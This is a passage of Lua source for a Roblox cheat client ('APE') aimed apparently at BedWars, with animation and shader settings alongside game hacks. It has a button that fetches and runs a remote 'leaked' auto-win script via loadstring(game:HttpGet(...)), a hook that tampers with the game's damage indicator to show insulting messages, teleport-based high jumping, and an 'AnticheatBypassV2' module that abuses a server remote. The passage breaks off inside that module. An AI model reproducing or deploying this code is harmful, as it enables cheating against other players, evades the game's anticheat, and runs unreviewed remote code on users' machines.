if animidle.Value == "Zombie" and animtype.Value == "Custom" then
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921344533"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921345304"
end
if animclimb.Value == "Zombie" and animtype.Value == "Custom" then
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921343576"
end
---Ninja
if animrun.Value == "Ninja" and animtype.Value == "Custom" then
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921157929" 	
end
if animwalk.Value == "Ninja" and animtype.Value == "Custom" then
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921162768"
end
if animfall.Value == "Ninja" and animtype.Value == "Custom" then
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921159222"
end
if animjump.Value == "Ninja" and animtype.Value == "Custom" then
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921160088"
end
if animidle.Value == "Ninja" and animtype.Value == "Custom" then
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921155160"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921155867"
end
if animclimb.Value == "Ninja" and animtype.Value == "Custom" then
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921154678"
end
---Knight
if animrun.Value == "Knight" and animtype.Value == "Custom" then
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921121197" 	
end
if animwalk.Value == "Knight" and animtype.Value == "Custom" then
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921127095"
end
if animfall.Value == "Knight" and animtype.Value == "Custom" then
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921122579"
end
if animjump.Value == "Knight" and animtype.Value == "Custom" then
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921123517"
end
if animidle.Value == "Knight" and animtype.Value == "Custom" then
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921117521"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921118894"
end
if animclimb.Value == "Knight" and animtype.Value == "Custom" then
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921116196"
end
---Mage
if animrun.Value == "Mage" and animtype.Value == "Custom" then
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921148209" 	
end
if animwalk.Value == "Mage" and animtype.Value == "Custom" then
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921152678"
end
if animfall.Value == "Mage" and animtype.Value == "Custom" then
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921148939"
end
if animjump.Value == "Mage" and animtype.Value == "Custom" then
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921149743"
end
if animidle.Value == "Mage" and animtype.Value == "Custom" then
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921144709"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921145797"
end
if animclimb.Value == "Mage" and animtype.Value == "Custom" then
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921143404"
end
---Pirate
if animrun.Value == "Pirate" and animtype.Value == "Custom" then
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=750783738" 	
end
if animwalk.Value == "Pirate" and animtype.Value == "Custom" then
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=750785693"
end
if animfall.Value == "Pirate" and animtype.Value == "Custom" then
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=750780242"
end
if animjump.Value == "Pirate" and animtype.Value == "Custom" then
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=750782230"
end
if animidle.Value == "Pirate" and animtype.Value == "Custom" then
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=750781874"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=750782770"
end
if animclimb.Value == "Pirate" and animtype.Value == "Custom" then
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=750779899"
end
---Elder
if animrun.Value == "Elder" and animtype.Value == "Custom" then
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921104374" 	
end
if animwalk.Value == "Elder" and animtype.Value == "Custom" then
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921111375"
end
if animfall.Value == "Elder" and animtype.Value == "Custom" then
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921105765"
end
if animjump.Value == "Elder" and animtype.Value == "Custom" then
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921107367"
end
if animidle.Value == "Elder" and animtype.Value == "Custom" then
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921101664"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921102574"
end
if animclimb.Value == "Elder" and animtype.Value == "Custom" then
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921100400"
end
---Toy (my favorite)
if animrun.Value == "Toy" and animtype.Value == "Custom" then
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921306285" 	
end
if animwalk.Value == "Toy" and animtype.Value == "Custom" then
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921312010"
end
if animfall.Value == "Toy" and animtype.Value == "Custom" then
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921307241"
end
if animjump.Value == "Toy" and animtype.Value == "Custom" then
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921308158"
end
if animidle.Value == "Toy" and animtype.Value == "Custom" then
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921301576"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921302207"
end
if animclimb.Value == "Toy" and animtype.Value == "Custom" then
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921300839"
end
---Bubbly
if animrun.Value == "Bubbly" and animtype.Value == "Custom" then
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921057244" 	
end
if animwalk.Value == "Bubbly" and animtype.Value == "Custom" then
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10980888364"
end
if animfall.Value == "Bubbly" and animtype.Value == "Custom" then
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921061530"
end
if animjump.Value == "Bubbly" and animtype.Value == "Custom" then
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921062673"
end
if animidle.Value == "Bubbly" and animtype.Value == "Custom" then
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921054344"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921055107"
end
if animclimb.Value == "Bubbly" and animtype.Value == "Custom" then
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921053544"
end
---Astronaut
if animrun.Value == "Astronaut" and animtype.Value == "Custom" then
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921039308" 	
end
if animwalk.Value == "Astronaut" and animtype.Value == "Custom" then
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921046031"
end
if animfall.Value == "Astronaut" and animtype.Value == "Custom" then
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921040576"
end
if animjump.Value == "Astronaut" and animtype.Value == "Custom" then
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921042494"
end
if animidle.Value == "Astronaut" and animtype.Value == "Custom" then
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921034824"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921036806"
end
if animclimb.Value == "Astronaut" and animtype.Value == "Custom" then
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921032124"
end
---Vampire
if animrun.Value == "Vampire" and animtype.Value == "Custom" then
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921320299" 	
end
if animwalk.Value == "Vampire" and animtype.Value == "Custom" then
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921326949"
end
if animfall.Value == "Vampire" and animtype.Value == "Custom" then
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921321317"
end
if animjump.Value == "Vampire" and animtype.Value == "Custom" then
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921322186"
end
if animidle.Value == "Vampire" and animtype.Value == "Custom" then
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921315373"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921316709"
end
if animclimb.Value == "Vampire" and animtype.Value == "Custom" then
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921314188"
end
---Werewolf
if animrun.Value == "Werewolf" and animtype.Value == "Custom" then
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921336997" 	
end
if animwalk.Value == "Werewolf" and animtype.Value == "Custom" then
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921342074"
end
if animfall.Value == "Werewolf" and animtype.Value == "Custom" then
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921337907"
end
if animjump.Value == "Werewolf" and animtype.Value == "Custom" then
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083218792"
end
if animidle.Value == "Werewolf" and animtype.Value == "Custom" then
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921330408"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921333667"
end
if animclimb.Value == "Werewolf" and animtype.Value == "Custom" then
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921329322"
end
---Rthro
if animrun.Value == "Rthro" and animtype.Value == "Custom" then
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921261968" 	
end
if animwalk.Value == "Rthro" and animtype.Value == "Custom" then
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921269718"
end
if animfall.Value == "Rthro" and animtype.Value == "Custom" then
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921262864"
end
if animjump.Value == "Rthro" and animtype.Value == "Custom" then
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921263860"
end
if animidle.Value == "Rthro" and animtype.Value == "Custom" then
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921258489"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921259953"
end
if animclimb.Value == "Rthro" and animtype.Value == "Custom" then
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921257536"
end
---Oldschool
if animrun.Value == "Oldschool" and animtype.Value == "Custom" then
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921240218" 	
end
if animwalk.Value == "Oldschool" and animtype.Value == "Custom" then
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921244891"
end
if animfall.Value == "Oldschool" and animtype.Value == "Custom" then
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921241244"
end
if animjump.Value == "Oldschool" and animtype.Value == "Custom" then
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921242013"
end
if animidle.Value == "Oldschool" and animtype.Value == "Custom" then
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921230744"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921232093"
end
if animclimb.Value == "Oldschool" and animtype.Value == "Custom" then
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921229866"
end
---Mr.Toilet
if animrun.Value == "Toilet" and animtype.Value == "Custom" then
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=4417979645" 	
end
if animidle.Value == "Toilet" and animtype.Value == "Custom" then
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=4417977954"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=4417978624"
end
---Ud'Zal
if animrun.Value == "Rthro Heavy Run" and animtype.Value == "Custom" then
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=3236836670" 	
end
if animidle.Value == "Ud'zal" and animtype.Value == "Custom" then
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=3303162274"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=3303162549"
end
if animwalk.Value == "Ud'zal" and animtype.Value == "Custom" then
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=3303162967"
	end
	if animtype.Value == "Tryhard" then
		Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921301576"
		Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921302207"
		Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921162768"
		Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921157929"
		Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921137402"
		Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921136539"
	end
	if animtype.Value == "Goofy" then
		Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=4417977954"
		Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=4417978624"
		Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921162768"
		Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=4417979645"
		Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921137402"
		Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921136539"
	end
	if animtype.Value == "Tanqr" then
		Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921034824"
		Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921036806"
		Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921312010"
		Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921306285"
		Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921242013"
		Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921136539"
	end
end)
	end
	end
	})
	animtype = anim.CreateDropdown({
		Name = "Type",
		List = {"Custom", "Tryhard", "Goofy", "Tanqr"},
		Function = function() end
	})
	animrun = anim.CreateDropdown({
		Name = "Run",
		List = {"Cartoony", "Levitation", "Robot", "Stylish", "Superhero", "Zombie", "Ninja", "Knight", "Mage", "Pirate", "Elder", "Toy", "Bubbly", "Astronaut", "Vampire", "Werewolf", "Rthro", "Oldschool", "Toilet", "Rthro Heavy Run"},
		Function = function() end
	})

	animwalk = anim.CreateDropdown({
		Name = "Walk",
		List = {"Cartoony", "Levitation", "Robot", "Stylish", "Superhero", "Zombie", "Ninja", "Knight", "Mage", "Pirate", "Elder", "Toy", "Bubbly", "Astronaut", "Vampire", "Werewolf", "Rthro", "Oldschool", "Ud'zal"},
		Function = function() end
	})

	animfall = anim.CreateDropdown({
		Name = "Fall",
		List = {"Cartoony", "Levitation", "Robot", "Stylish", "Superhero", "Zombie", "Ninja", "Knight", "Mage", "Pirate", "Elder", "Toy", "Bubbly", "Astronaut", "Vampire", "Werewolf", "Rthro", "Oldschool"},
		Function = function() end
	})

	animjump = anim.CreateDropdown({
		Name = "Jump",
		List = {"Cartoony", "Levitation", "Robot", "Stylish", "Superhero", "Zombie", "Ninja", "Knight", "Mage", "Pirate", "Elder", "Toy", "Bubbly", "Astronaut", "Vampire", "Werewolf", "Rthro", "Oldschool"},
		Function = function() end
	})

	animidle = anim.CreateDropdown({
		Name = "Idle",
		List = {"Cartoony", "Levitation", "Robot", "Stylish", "Superhero", "Zombie", "Ninja", "Knight", "Mage", "Pirate", "Elder", "Toy", "Bubbly", "Astronaut", "Vampire", "Werewolf", "Rthro", "Oldschool", "Toilet", "Ud'zal"},
		Function = function() end
	})

	animclimb = anim.CreateDropdown({
		Name = "Climb",
		List = {"Cartoony", "Levitation", "Robot", "Stylish", "Superhero", "Zombie", "Ninja", "Knight", "Mage", "Pirate", "Elder", "Toy", "Bubbly", "Astronaut", "Vampire", "Werewolf", "Rthro", "Oldschool"},
		Function = function() end
	})
end)


				runFunction(function()
					local DuelsAutoWin = {Enabled = false}
					DuelsAutoWin = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
					Name = "AlSploit Autowin Leaked",
					HoverText = "auto win the duels and its leaked alsploit",
					Function = function(callback)
						if callback then
						task.spawn(function()
						loadstring(game:HttpGet('https://raw.githubusercontent.com/RayFaxiu/APEForRoblox/main/AutoWin.lua'))()
						end)
					end
				end
						})
					end)

local Shaders = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
	["Name"] = "Shaders",
	["Function"] = function(callback)
		if callback then
			workspace.Gravity = 192
			pcall(function()
				game:GetService("Lighting"):ClearAllChildren()
				local Bloom = Instance.new("BloomEffect")
				Bloom.Intensity = 0.1
				Bloom.Threshold = 0
				Bloom.Size = 100

				local Tropic = Instance.new("Sky")
				Tropic.Name = "Tropic"
				Tropic.SkyboxUp = "http://www.roblox.com/asset/?id=169210149"
				Tropic.SkyboxLf = "http://www.roblox.com/asset/?id=169210133"
				Tropic.SkyboxBk = "http://www.roblox.com/asset/?id=169210090"
				Tropic.SkyboxFt = "http://www.roblox.com/asset/?id=169210121"
				Tropic.StarCount = 100
				Tropic.SkyboxDn = "http://www.roblox.com/asset/?id=169210108"
				Tropic.SkyboxRt = "http://www.roblox.com/asset/?id=169210143"
				Tropic.Parent = Bloom

				local Sky = Instance.new("Sky")
				Sky.SkyboxUp = "http://www.roblox.com/asset/?id=196263782"
				Sky.SkyboxLf = "http://www.roblox.com/asset/?id=196263721"
				Sky.SkyboxBk = "http://www.roblox.com/asset/?id=196263721"
				Sky.SkyboxFt = "http://www.roblox.com/asset/?id=196263721"
				Sky.CelestialBodiesShown = false
				Sky.SkyboxDn = "http://www.roblox.com/asset/?id=196263643"
				Sky.SkyboxRt = "http://www.roblox.com/asset/?id=196263721"
				Sky.Parent = Bloom

				Bloom.Parent = game:GetService("Lighting")

				local Bloom = Instance.new("BloomEffect")
				Bloom.Enabled = false
				Bloom.Intensity = 0.35
				Bloom.Threshold = 0.2
				Bloom.Size = 56

				local Tropic = Instance.new("Sky")
				Tropic.Name = "Tropic"
				Tropic.SkyboxUp = "http://www.roblox.com/asset/?id=169210149"
				Tropic.SkyboxLf = "http://www.roblox.com/asset/?id=169210133"
				Tropic.SkyboxBk = "http://www.roblox.com/asset/?id=169210090"
				Tropic.SkyboxFt = "http://www.roblox.com/asset/?id=169210121"
				Tropic.StarCount = 100
				Tropic.SkyboxDn = "http://www.roblox.com/asset/?id=169210108"
				Tropic.SkyboxRt = "http://www.roblox.com/asset/?id=169210143"
				Tropic.Parent = Bloom

				local Sky = Instance.new("Sky")
				Sky.SkyboxUp = "http://www.roblox.com/asset/?id=196263782"
				Sky.SkyboxLf = "http://www.roblox.com/asset/?id=196263721"
				Sky.SkyboxBk = "http://www.roblox.com/asset/?id=196263721"
				Sky.SkyboxFt = "http://www.roblox.com/asset/?id=196263721"
				Sky.CelestialBodiesShown = false
				Sky.SkyboxDn = "http://www.roblox.com/asset/?id=196263643"
				Sky.SkyboxRt = "http://www.roblox.com/asset/?id=196263721"
				Sky.Parent = Bloom

				Bloom.Parent = game:GetService("Lighting")
				local Blur = Instance.new("BlurEffect")
				Blur.Size = 2

				Blur.Parent = game:GetService("Lighting")
				local Efecto = Instance.new("BlurEffect")
				Efecto.Name = "Efecto"
				Efecto.Enabled = false
				Efecto.Size = 2

				Efecto.Parent = game:GetService("Lighting")
				local Inaritaisha = Instance.new("ColorCorrectionEffect")
				Inaritaisha.Name = "Inari taisha"
				Inaritaisha.Saturation = 0.05
				Inaritaisha.TintColor = Color3.fromRGB(255, 224, 219)

				Inaritaisha.Parent = game:GetService("Lighting")
				local Normal = Instance.new("ColorCorrectionEffect")
				Normal.Name = "Normal"
				Normal.Enabled = false
				Normal.Saturation = -0.2
				Normal.TintColor = Color3.fromRGB(255, 232, 215)

				Normal.Parent = game:GetService("Lighting")
				local SunRays = Instance.new("SunRaysEffect")
				SunRays.Intensity = 0.05

				SunRays.Parent = game:GetService("Lighting")
				local Sunset = Instance.new("Sky")
				Sunset.Name = "Sunset"
				Sunset.SkyboxUp = "rbxassetid://323493360"
				Sunset.SkyboxLf = "rbxassetid://323494252"
				Sunset.SkyboxBk = "rbxassetid://323494035"
				Sunset.SkyboxFt = "rbxassetid://323494130"
				Sunset.SkyboxDn = "rbxassetid://323494368"
				Sunset.SunAngularSize = 14
				Sunset.SkyboxRt = "rbxassetid://323494067"

				Sunset.Parent = game:GetService("Lighting")
				local Takayama = Instance.new("ColorCorrectionEffect")
				Takayama.Name = "Takayama"
				Takayama.Enabled = false
				Takayama.Saturation = -0.3
				Takayama.Contrast = 0.1
				Takayama.TintColor = Color3.fromRGB(235, 214, 204)

				Takayama.Parent = game:GetService("Lighting")
				local L = game:GetService("Lighting")
				L.Brightness = 2.14
				L.ColorShift_Bottom = Color3.fromRGB(11, 0, 20)
				L.ColorShift_Top = Color3.fromRGB(240, 127, 14)
				L.OutdoorAmbient = Color3.fromRGB(34, 0, 49)
				L.ClockTime = 6.7
				L.FogColor = Color3.fromRGB(94, 76, 106)
				L.FogEnd = 1000
				L.FogStart = 0
				L.ExposureCompensation = 0.24
				L.ShadowSoftness = 0
				L.Ambient = Color3.fromRGB(59, 33, 27)

				local Bloom = Instance.new("BloomEffect")
				Bloom.Intensity = 0.1
				Bloom.Threshold = 0
				Bloom.Size = 100

				local Tropic = Instance.new("Sky")
				Tropic.Name = "Tropic"
				Tropic.SkyboxUp = "http://www.roblox.com/asset/?id=169210149"
				Tropic.SkyboxLf = "http://www.roblox.com/asset/?id=169210133"
				Tropic.SkyboxBk = "http://www.roblox.com/asset/?id=169210090"
				Tropic.SkyboxFt = "http://www.roblox.com/asset/?id=169210121"
				Tropic.StarCount = 100
				Tropic.SkyboxDn = "http://www.roblox.com/asset/?id=169210108"
				Tropic.SkyboxRt = "http://www.roblox.com/asset/?id=169210143"
				Tropic.Parent = Bloom

				local Sky = Instance.new("Sky")
				Sky.SkyboxUp = "http://www.roblox.com/asset/?id=196263782"
				Sky.SkyboxLf = "http://www.roblox.com/asset/?id=196263721"
				Sky.SkyboxBk = "http://www.roblox.com/asset/?id=196263721"
				Sky.SkyboxFt = "http://www.roblox.com/asset/?id=196263721"
				Sky.CelestialBodiesShown = false
				Sky.SkyboxDn = "http://www.roblox.com/asset/?id=196263643"
				Sky.SkyboxRt = "http://www.roblox.com/asset/?id=196263721"
				Sky.Parent = Bloom

				Bloom.Parent = game:GetService("Lighting")

				local Bloom = Instance.new("BloomEffect")
				Bloom.Enabled = false
				Bloom.Intensity = 0.35
				Bloom.Threshold = 0.2
				Bloom.Size = 56

				local Tropic = Instance.new("Sky")
				Tropic.Name = "Tropic"
				Tropic.SkyboxUp = "http://www.roblox.com/asset/?id=169210149"
				Tropic.SkyboxLf = "http://www.roblox.com/asset/?id=169210133"
				Tropic.SkyboxBk = "http://www.roblox.com/asset/?id=169210090"
				Tropic.SkyboxFt = "http://www.roblox.com/asset/?id=169210121"
				Tropic.StarCount = 100
				Tropic.SkyboxDn = "http://www.roblox.com/asset/?id=169210108"
				Tropic.SkyboxRt = "http://www.roblox.com/asset/?id=169210143"
				Tropic.Parent = Bloom

				local Sky = Instance.new("Sky")
				Sky.SkyboxUp = "http://www.roblox.com/asset/?id=196263782"
				Sky.SkyboxLf = "http://www.roblox.com/asset/?id=196263721"
				Sky.SkyboxBk = "http://www.roblox.com/asset/?id=196263721"
				Sky.SkyboxFt = "http://www.roblox.com/asset/?id=196263721"
				Sky.CelestialBodiesShown = false
				Sky.SkyboxDn = "http://www.roblox.com/asset/?id=196263643"
				Sky.SkyboxRt = "http://www.roblox.com/asset/?id=196263721"
				Sky.Parent = Bloom

				Bloom.Parent = game:GetService("Lighting")
				local Blur = Instance.new("BlurEffect")
				Blur.Size = 2

				Blur.Parent = game:GetService("Lighting")
				local Efecto = Instance.new("BlurEffect")
				Efecto.Name = "Efecto"
				Efecto.Enabled = false
				Efecto.Size = 4

				Efecto.Parent = game:GetService("Lighting")
				local Inaritaisha = Instance.new("ColorCorrectionEffect")
				Inaritaisha.Name = "Inari taisha"
				Inaritaisha.Saturation = 0.05
				Inaritaisha.TintColor = Color3.fromRGB(255, 224, 219)

				Inaritaisha.Parent = game:GetService("Lighting")
				local Normal = Instance.new("ColorCorrectionEffect")
				Normal.Name = "Normal"
				Normal.Enabled = false
				Normal.Saturation = -0.2
				Normal.TintColor = Color3.fromRGB(255, 232, 215)

				Normal.Parent = game:GetService("Lighting")
				local SunRays = Instance.new("SunRaysEffect")
				SunRays.Intensity = 0.05

				SunRays.Parent = game:GetService("Lighting")
				local Sunset = Instance.new("Sky")
				Sunset.Name = "Sunset"
				Sunset.SkyboxUp = "rbxassetid://323493360"
				Sunset.SkyboxLf = "rbxassetid://323494252"
				Sunset.SkyboxBk = "rbxassetid://323494035"
				Sunset.SkyboxFt = "rbxassetid://323494130"
				Sunset.SkyboxDn = "rbxassetid://323494368"
				Sunset.SunAngularSize = 14
				Sunset.SkyboxRt = "rbxassetid://323494067"

				Sunset.Parent = game:GetService("Lighting")
				local Takayama = Instance.new("ColorCorrectionEffect")
				Takayama.Name = "Takayama"
				Takayama.Enabled = false
				Takayama.Saturation = -0.3
				Takayama.Contrast = 0.1
				Takayama.TintColor = Color3.fromRGB(235, 214, 204)

				Takayama.Parent = game:GetService("Lighting")
				local L = game:GetService("Lighting")
				L.Brightness = 2.3
				L.ColorShift_Bottom = Color3.fromRGB(11, 0, 20)
				L.ColorShift_Top = Color3.fromRGB(240, 127, 14)
				L.OutdoorAmbient = Color3.fromRGB(34, 0, 49)
				L.TimeOfDay = "07:30:00"
				L.FogColor = Color3.fromRGB(94, 76, 106)
				L.FogEnd = 300
				L.FogStart = 0
				L.ExposureCompensation = 0.24
				L.ShadowSoftness = 0
				L.Ambient = Color3.fromRGB(59, 33, 27)
			end)
		else
			pcall(function()
			end)
		end
	end,
	["Default"] = false,
	["HoverText"] = "Shaders reel"
})

local Messages = {"APE", "Kiddo", "EZ", "Thump!", "Hit!", "Bad", "UrSuck", "Fuck", "L Kid", "Pipe L"
}
local old
local FunnyIndicator = {Enabled = false}
FunnyIndicator = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
Name = "DamageIndicator",
Function = function(Callback)
    FunnyIndicator.Enabled = Callback
    if FunnyIndicator.Enabled then
        old = debug.getupvalue(bedwars.DamageIndicator, 10)["Create"]
        debug.setupvalue(bedwars.DamageIndicator, 10, {
            Create = function(self, obj, ...)
                spawn(function()
                    pcall(function()
                        obj.Parent.Text = Messages[math.random(1, #Messages)]
                        obj.Parent.TextColor3 = Color3.fromHSV(tick() % 5 / 5, 1, 1)
                    end)
                end)
                return game:GetService("TweenService"):Create(obj, ...)
            end
        })
    else
        debug.setupvalue(bedwars.DamageIndicator, 10, {
            Create = old
        })
        old = nil
    end
end
})

runFunction(function()
    fortniteballs = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
        Name = "BetterHighJump",
        Function = function(callback)
            if callback then
                game.Workspace.Gravity = 0
                repeat task.wait(0.01)
                    local player = game.Players.LocalPlayer
                    local character = player.Character or player.CharacterAdded:Wait()
                    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
                    humanoidRootPart.CFrame = humanoidRootPart.CFrame + Vector3.new(0, 10, 0)
                until (not fortniteballs.Enabled)
            else
                game.Workspace.Gravity = 196.2
            end
        end
    })
end)

runFunction(function()
    local Disabler = {Enabled = false}
	local DisablerMode = {Value = "MoveDirection"}
	local DisablerMissing = {Value = "Continue"}
	local DisablerNotify = {Value = "Vape"}
	local DisablerDuration = {Value = 5}
	local DisablerSpeedVal = {Value = 90}
	local DisablerSpeed = {Enabled = true}
	local DisablerNotification = {Enabled = true}
	local DisablerTable = {
		Values = {
			Duration = DisablerDuration.Value,
			MainSpeed = DisablerSpeedVal.Value * 1000 + 9.999
		},
		Messages = {
			Title = "AnticheatBypassV2",
			Context1 = "Hold the Scythe in your hand!",
			Context2 = "Scythe not found!",
			Context3 = "[Disabler] Hold the Scythe in your hand!",
			Context4 = "[Disabler] Scythe not found!"
		}
	}
	local SendNotify
	local NoDisable
	local HeartbeatConnection
	local RenderSteppedConnection
	local function getRenderStepped()
		if DisablerMode.Value == "MoveDirection" then
			game:GetService("ReplicatedStorage").rbxts_include.node_modules:FindFirstChild("@rbxts").net.out._NetManaged.ScytheDash:FireServer({
				direction = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Humanoid").MoveDirection * 10000
			})
		elseif DisablerMode.Value == "LookVector" then
			game:GetService("ReplicatedStorage").rbxts_include.node_modules:FindFirstChild("@rbxts").net.out._NetManaged.ScytheDash:FireServer({
				direction = game:GetService("Players").LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame.LookVector * 10000
			})
		end
	end
	local HeartBeatConnect = tick()
	local function getHeartBeat()
